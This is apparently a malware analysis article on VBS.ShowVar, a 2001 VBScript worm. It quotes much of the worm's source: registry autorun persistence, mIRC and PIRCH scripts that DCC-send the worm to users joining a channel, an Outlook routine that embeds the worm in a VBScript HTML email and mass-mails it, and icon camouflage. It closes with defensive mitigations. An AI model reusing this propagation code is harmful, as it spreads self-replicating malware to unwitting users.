# Dissecting VBS.ShowVar: An IRC- and Email‑Spreading VBScript Worm 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
VBS.ShowVar (dated January 2001), attributed to "PetiK," is a classic Windows Script Host (WSH) malware written in VBScript. It blends multiple propagation vectors—mIRC and PIRCH IRC clients as well as Microsoft Outlook—while establishing persistence and performing mild system tampering to hide its presence. The worm leverages social engineering and legacy features like ActiveX in HTML emails to drop and execute a copy of itself on victim machines. Examining the source code provides a window into early-2000s tradecraft: crude obfuscation via character codes, broad address‑book spraying, registry‑based autorun, and client‑side scripts for IRC‑based file transfer. Understanding these foundations helps defenders reason about family resemblances with modern script droppers, macro malware, and social‑engineering‑heavy campaigns. In this article, we break down VBS.ShowVar’s lifecycle—installation, persistence, spreading, and small “cosmetic” changes—to highlight concrete indicators, behaviors, and practical defenses.

## Section 1 – Overview of the Malware 🐛
VBS.ShowVar’s purpose is straightforward: replicate and spread while keeping a low profile. On execution, it copies itself into the Windows directory under the name Showvar.vbs and configures a Run key under HKLM so it auto‑starts for all users. Next, it attempts to propagate through two popular IRC clients of the era—mIRC and PIRCH—by writing event scripts that automatically send the worm to other users who join the same channels. It also contains an email propagation routine that abuses Outlook automation and constructs a VBScript‑enabled HTML message: if a recipient’s client allows ActiveX/VBScript, the message writes a file named Worm.vbs into the temporary directory and launches it via wscript.exe.

The worm lightly tampers with user experience to aid evasion and novelty. A Divers function changes the file icon association of .vbs files to mimic .txt files, potentially reducing suspicion. On a specific day of the month, it pops a friendly “Wargames”‑themed message box. Typical targets are consumer and small‑office Windows installations of the time where Outlook, mIRC/PIRCH, and WSH are present and scripting restrictions are lax. The infection vector is casual execution (double‑clicking the .vbs) followed by lateral spread via IRC and broad BCC‑style email blasts. There’s no encryption or heavy stealth—just permissive defaults and social engineering.

## Section 2 – Source Code Analysis 🔬
The code is organized into a startup routine (DEBUT) and feature‑specific functions: Mirc, Pirch, EMail, and Divers. Error handling is often suppressed via On Error Resume Next, masking failures and improving resilience across heterogeneous environments.

### Persistence and Self‑Copy
```vb
Set win  = fso.GetspecialFolder(0)
RUN  = ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ShowVar")
Set c    = fso.GetFile(WScript.ScriptFullName)
ShowVar  = (win & "\Showvar.vbs")
c.Copy   (ShowVar)
ws.RegWrite RUN, ShowVar
```
- The worm resolves the Windows directory (special folder 0) and defines a Run key path under HKLM (autorun for all users).
- It copies itself to Windows\Showvar.vbs and writes the autorun value pointing to that copy.
- This is stable persistence without relying on user‑specific profiles.

The main entry then gates its propagation routines with simple per‑component markers under HKCU\Software\ShowVar. For example, the mIRC block runs only if the marker HKCU\Software\ShowVar\MIRC is not set to "1".

### mIRC Propagation (script.ini)
```vb
PFD = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
SV2 = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ShowVar")
Set Script = fso.CreateTextFile(Path & "\script.ini", True)
Script.writeline "[script]"
Script.writeline "n0=on 1:JOIN:#:{"
Script.writeline "n1=  /if ( $nick == $me ) { halt }"
Script.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick " & SV2
Script.writeline "n3=}"
Script.Close
ws.RegWrite "HKCU\Software\ShowVar\MIRC", "1"
```
- The code discovers the Program Files directory and reads SV2, the full path stored in the Run\ShowVar value—i.e., the location of the persisted copy.
- It writes a standard mIRC script.ini with an ON JOIN handler that DCC‑sends the worm to any user joining a channel. The string "dcc" is obfuscated as chr(100) chr(99) chr(99) to evade naive keyword filters.
- A per‑user registry flag marks this step as completed.

### PIRCH Propagation (events.ini)
```vb
SV3 = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ShowVar")
Set Script = fso.CreateTextFile(path & "\events.ini", True)
Script.WriteLine "[100-Level 100]"
Script.WriteLine "User1=*!*@*"
Script.WriteLine "UserCount=1"
Script.WriteLine "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & SV3
Script.WriteLine "EventCount=1"
Script.Close
ws.RegWrite "HKCU\Software\ShowVar\PIRCH", "1"
```
- PIRCH’s event system is configured so that, upon a JOIN event, the client performs a DCC tsend of the worm to the joining nick.
- As with mIRC, the payload path is the autorun copy, and the term "dcc" is built via character codes.

### Outlook/HTML Email Propagation
The email routine is the most complex: it constructs an HTML body that, when opened with ActiveX/VBScript allowed, writes a file called Worm.vbs into the temp directory and executes it via wscript.exe. Then it mass‑emails that HTML to the user’s address books via BCC.

```vb
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
  Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
  Do While Myself.atendofstream = False
    MyLine = Myself.readline
    Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & _
           Replace(MyLine, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
  Loop
  Myself.Close
  htm = "<HTML>...<SCRIPT language=vbscript>" & vbCrLf & "On Error Resume Next"
  htm = htm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
  htm = htm & vbCrLf & "If Err.Number <> 0 Then"
  htm = htm & vbCrLf & "document.write " & Chr(34) & _
        "<font ...>Pour lire cet EMail, merci d'activer l'option ActiveX...</font>" & Chr(34)
  htm = htm & vbCrLf & "Else"
  htm = htm & vbCrLf & "Set vbs = fso.CreateTextFile(fso.GetSpecialFolder(1) & " & Chr(34) & _
        "\Worm.vbs" & Chr(34) & ", True)"
  htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
  htm = htm & vbCrLf & "vbs.Close"
  htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
  htm = htm & vbCrLf & "ws.run fso.GetSpecialFolder(0) & " & Chr(34) & _
        "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(1) & " & Chr(34) & "\Worm.vbs %" & Chr(34)
  ' ... builds HtmlBody and sends via BCC to all address entries ...
End If
```
- The routine reads its own source (Myself) and escapes quotes into a string Code so that it can be embedded literally into an HTML/Script payload. This is a self‑reproduction trick via HTML.
- The generated HTML uses VBScript to create Worm.vbs in the temp directory (GetSpecialFolder(1)) and executes it with wscript.exe. If VBScript/ActiveX is blocked, a message in French instructs the user to enable ActiveX—blatant social engineering.
- The email is composed with Msg.BCC populated with all addresses from each AddressList to avoid tipping off recipients by listing them openly in To/CC, and to maximize reach in one submission. The subject is: “Salut l’ami. Ouvre vite, la chance peut tourner !!”.
- A registry marker HKCU\Software\ShowVar\MAIL is set to "1" once the routine runs.

### Cosmetic Tampering and Payload‑Lite Behavior
```vb
If Day(Now()) = 5 Then
  MsgBox "Et si on faisait une partie d'echec ?", vbinformation, "WarGames"
End If
AZE = ws.RegRead ("HKCR\txtfile\DefaultIcon")
ws.RegWrite "HKCR\VBSfile\DefaultIcon\", AZE
```
- On the 5th day of any month, the worm displays a non‑malicious message box (likely for notoriety).
- It reads the default icon for .txt files and assigns the same icon to .vbs files by writing to HKCR\VBSfile\DefaultIcon. This is simple camouflage: scripts look like text files in Explorer.

### Error Handling and Guards
- On Error Resume Next is used widely, allowing the worm to continue even if components (Outlook, IRC clients) are missing, reducing crashes and increasing coverage.
- The use of HKCU\Software\ShowVar markers (MIRC, PIRCH, MAIL) prevents repeated reconfiguration on the same user profile.
- Obfuscation is minimal (chr() for “dcc”); there is no encryption or packing.

## Section 3 – Mitigation and Defense Strategies 🛡️
- Block VBScript/ActiveX in email clients and browsers. Modern Outlook and most mail services already disable active content—verify organizational policies, and train users to avoid enabling ActiveX in emails.
- Harden WSH and file associations. Disable Windows Script Host for standard users where feasible; enforce that .vbs files open in a text editor instead of executing. Leverage application control (AppLocker/WDAC) to block wscript.exe and cscript.exe except where explicitly required.
- Monitor registry autoruns and file association changes. Alert on writes to HKLM\...\Run and HKCR\VBSfile\DefaultIcon. EDR tools should watch for wscript.exe spawning from email clients or browsers and for creation of Worm.vbs in temp directories.
- Detections for IRC clients. If mIRC/PIRCH are in use, monitor for creation/changes to script.ini or events.ini and for automated DCC/tsend actions. Network monitoring can flag unusual DCC file transfers.
- Email security. Use attachment filtering (block or quarantine .vbs), sandbox detonation for HTML/MSG files, and anti‑spoofing (SPF/DKIM/DMARC) to reduce social engineering success.
- Principle of least privilege. Running users without admin rights limits registry writes to HKLM and system folders, breaking persistence attempts like ShowVar’s.
- Developer/admin guidance. Developers should avoid embedding active content in emails. Admins should baseline autoruns and file associations, deploy EDR rules for suspicious wscript.exe usage, and ensure Office/Outlook are up to date.

## Conclusion
VBS.ShowVar illustrates the enduring power of social engineering combined with permissive client‑side scripting. Its tri‑vector spread (IRC via mIRC/PIRCH and email via Outlook) along with registry‑based persistence, minimal obfuscation, and cosmetic icon tampering provide a compact case study in early 2000s Windows malware. While many defenses have since improved—especially default blocking of VBScript/ActiveX in email—variants of these techniques still show up in macro malware, HTML smuggling, and script‑based droppers. By focusing on hardening endpoints (particularly scripting hosts), monitoring high‑signal behaviors (autoruns, file‑association changes, DCC transfers), and educating users about active content prompts, defenders can blunt both legacy threats and their modern descendants. Studying source code like this helps map simple building blocks to practical detections and durable mitigations.

